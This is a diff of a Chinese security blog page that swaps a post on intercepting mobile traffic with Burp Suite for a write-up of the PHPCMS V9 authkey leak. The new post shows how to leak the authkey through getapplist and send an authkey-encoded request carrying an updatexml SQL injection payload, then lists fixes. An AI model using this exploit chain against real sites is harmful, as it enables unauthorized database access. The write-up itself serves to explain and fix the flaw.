@@ -3,7 +3,7 @@
     <meta charset="utf-8" />
 <meta name="description" content="" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>移动端安全修炼（一） | Brick713 的小黑屋</title>
+<title>PHPCMS Authkey 泄露漏洞分析 | Brick713 的小黑屋</title>
 <link rel="shortcut icon" href="https://brick713.github.io/favicon.ico?v=1558538946242">
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
@@ -86,40 +86,57 @@
         <div class="post-detail">
           <article class="post">
             <h2 class="post-title">
-              移动端安全修炼（一）
+              PHPCMS Authkey 泄露漏洞分析
             </h2>
             <div class="post-info">
               <time class="post-time">
-                · 2016-04-06 ·
+                · 2016-03-10 ·
               </time>
               
-                <a href="https://brick713.github.io/tag/RXGWrzC76" class="post-tag">
-                  # 移动端安全
+                <a href="https://brick713.github.io/tag/_uZZVFsLT" class="post-tag">
+                  # 漏洞分析
                 </a>
               
             </div>
             
             <div class="post-content">
               <!-- more -->
-<p>新开一个坑，主要是记录自己学习移动端的一些相关知识。从基础到复杂吧，也不知道能写多少。从最开始的环境开始。</p>
-<p>移动端安全和Web差别并不大，也是分为服务端和客户端，只不过客户端换成了一个App，服务端和Web基本一致。因此挖掘服务端端漏洞和Web没有太大差别。重点在于如何挖掘客户端端漏洞，涉及反编译，代码审计，等等。</p>
-<p>如果想要开始漏洞挖掘，最基本的还是要一个真实环境，一搬有两种方法，虚拟机和实体机，之前尝试过用虚拟机安装但是坑比较多，暂时放弃了，因为我手上有一台Android和iOS设备，因此暂时使用实体机器进行测试。开始主要针对服务端，那么就要涉及抓包，这里讲下怎么抓包。</p>
-<p>这里只讲一种方法，抓包的方式很多，后面也许会补充，我只讲自己用到的。</p>
-<p>需要工具：</p>
+<h1 id="phpcms-v9-authkey泄露漏洞">PHPCMS V9 Authkey泄露漏洞</h1>
+<p>在PHPCMS V9的版本中（现已修复）</p>
+<p><code>phpcms/phpsso\_server/phpcms/modules/phpsso/index.php</code></p>
+<p>中有一段代码如下：</p>
+<pre><code>/**
+* 获取应用列表
+*/
+    public function getapplist() {
+        $applist = getcache('applist', 'admin');
+        exit(serialize($applist));
+        }
+</code></pre>
+<p>此处可以获取cache_admin的信息，内容如下：</p>
+<p><img src="https://i.loli.net/2018/06/27/5b33658cc7db1.png" alt="PHPCMS AUTHKEY.png"></p>
+<p>可以获得authkey和调用它的文件<code>api.php</code></p>
+<p>获得cache的URL是通过上传用户头像处可以解出来：</p>
+<p><code>http://localhost:8038/study/phpcms/phpsso_server/index.php?m=phpsso&amp;c=index&amp;a=uploadavatar&amp;auth_data=v=1&amp;appid=1&amp;data=e5c2VAMGUQZRAQkIUQQKVwFUAgICVgAIAldVBQFDDQVcV0MUQGkAQxVZZlMEGA9%2BDjZoK1AHRmUwBGcOXW5UDgQhJDxaeQVnGAdxVRcKQA</code></p>
+<p>将其中的uploadavatar替换成getapplist即可获取cache信息。</p>
+<p>拿到authkey之后，就可以利用他编码请求从而达到执行特定操作的目的。</p>
+<p>通过cache_admin可以看出来在api.php?op=phpsso处调用了authkey。我们直接定位到该处。使用authkey加密payload。</p>
+<p><code>http://localhost/api.php?op=phpsso&amp;code=6f56BQgIUVQDVAkGUwEFCgwDAwNSAVBdA1UHD1RSURFZDlgIS0EPCFwDUFhFFl1dCBMWVlkHE0xDUFJDBktfCRhQGlZXVgIFR0weSERPQUpQRh4eHk8CEBA</code></p>
+<p>加密的语句是：<code>action=synlogin&amp;uid=' and updatexml(1,concat('~',user()),1)#</code></p>
+<p>执行完后的结果：</p>
+<p><img src="https://i.loli.net/2018/06/27/5b3365aa949dc.png" alt="结果"></p>
+<h1 id="修复">修复</h1>
 <ol>
-<li>电脑一台</li>
-<li>burpsuite</li>
+<li>
+<p>升级PHPCMS版本</p>
+</li>
+<li>
+<p>删除cache文件</p>
+</li>
+<li>
+<p>修改默认的authkey</p>
+</li>
 </ol>
-<p>查看下自己电脑的IP，确保手机和电脑在同一个网络环境下。</p>
-<p><img src="https://i.loli.net/2018/06/27/5b3365f083db3.jpg" alt="IP"></p>
-<p>然后修改手机的Wi-Fi设置，将代理设置为该IP（以Android和ios为例）：</p>
-<p><img src="https://i.loli.net/2018/06/27/5b33660ba2f2e.jpg" alt="手机"></p>
-<p>这样http的流量就会经过你的电脑，接下来需要配置burpsuite</p>
-<p><img src="https://i.loli.net/2018/06/27/5b33664558c7c.jpg" alt="burpsuite"></p>
-<p>这样就可以拦截http流量，但是大部分的流量是https的还需要倒入证书，使用手机的浏览器访问你的代理ip＋端口，可以看到burpsutie的界面，点击<strong>CA Certificate</strong>证书，可以把证书下载，然后倒入手机中即可</p>
-<p><img src="https://i.loli.net/2018/06/27/5b336663e7d73.jpg" alt=""></p>
-<p>这样可以看到流量http和https都经过你的电脑了，就可以像测试web一样进行抓包测试了。</p>
-<p>以上是最简单的抓包配置。从这基本上就可以开始进行简单的测试，新世界的大门就打开了。</p>
 
             </div>
           </article>
@@ -128,9 +145,9 @@
         
           <div class="next-post">
             <div class="next">下一篇</div>
-            <a href="https://brick713.github.io/post/phpcms-authkey-xie-lu-lou-dong-fen-xi">
+            <a href="https://brick713.github.io/post/nginx-an-quan-xing-neng-pei-zhi-andddos-fang-fan">
               <h3 class="post-title">
-                PHPCMS Authkey 泄露漏洞分析
+                Nginx安全性能配置&amp;&amp;DDOS防范
               </h3>
             </a>
           </div>
